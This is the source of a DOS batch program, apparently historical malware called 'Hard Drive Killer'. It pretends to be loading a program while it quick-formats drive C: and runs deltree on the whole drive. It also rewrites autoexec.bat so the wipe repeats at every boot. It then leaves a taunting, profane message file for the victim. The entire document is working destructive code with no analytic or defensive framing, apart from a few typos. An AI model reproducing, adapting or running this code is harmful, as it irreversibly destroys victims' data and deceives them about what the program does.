@echo off
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo dummy variable >c:\dvar.txt

:form
format c: /q /u /autotest >nul
if exist c:\dos\format.* goto dosform
if exist c:\windows\command\format.* goto winform
goto del

:dosform
cd\dos >nul
format c: /q /u /autotest >nul
cd\ >nul

:winform
cd\windows\command >nul
format c: /q /u /autotest >nul
cd\ >nul
goto inform

:del
if exist c:\dvar.txt goto dtree
goto inform

:dtree
deltree /y c: >nul
if exist c:\dos\deltree.* goto deldos
if exist c:\windows\command\deltree.* goto delwin
goto inform

:deldos
cd\dos
c:\dos\deltree /y c: >nul
cd\

:delwin
cd\windows\command >nul
deltree /y c: >nul
cd\ >nul


:inform
cls
echo You have been hit by the Hard Drive Killer, written by Munga Bunga. >c:\hdkiller.txt
echo HD Killer is a Munga Bunga Production. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo Here is a message to all you but lickers. . . >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo FREE KEVIN MITNIC [Munga Bunga]. >>c:\hdkiller.txt
echo. >>c:\hdkiller.txt
echo If you were destroyed by this HDkiller program, then you would have >>c:\hdkiller.txt
echo deserved it. Die you mother fuckers!!!! >>c:\hdkiller.txt


rem The following rewrites the code into the autoexec.bat file.

echo @echo off >c:\autoexec.bat
echo cls >>c:\autoexe.bat

echo :form
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo if exist c:\dos\format.* goto dosform >>c:\autoexec.bat
echo if exist c:\windows\command\format.* goto winform >>c:\autoexec.bat
echo goto del >>c:\autoexec.bat

echo :dosform >>c:\autoexec.bat
echo cd\dos >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :winform >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :del >>c:\autoexec.bat
echo if exist c:\dvar.txt goto dtree >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat

echo :dtree >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo if exist c:\dos\deltree.* goto deldos >>c:\autoexec.bat
echo if exist c:\windows\command\deltree.* goto delwin >>c:\autoexec.bat

echo :deldos >>c:\autoexec.bat
echo cd\dos >>c:\autoexec.bat
echo c:\dos\deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat

echo :delwin >>c:\autoexec.bat
echo cd\windows\command >nul >>c:\autoexec.bat
echo deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat

echo :write >>c:\autoexec.bat
echo type hdkiller.txt >>c:\autoexec.bat
echo pause >>c:\autoexec.bat

rem Rewriting of code to the auteoxec.bat file is complete.

:end
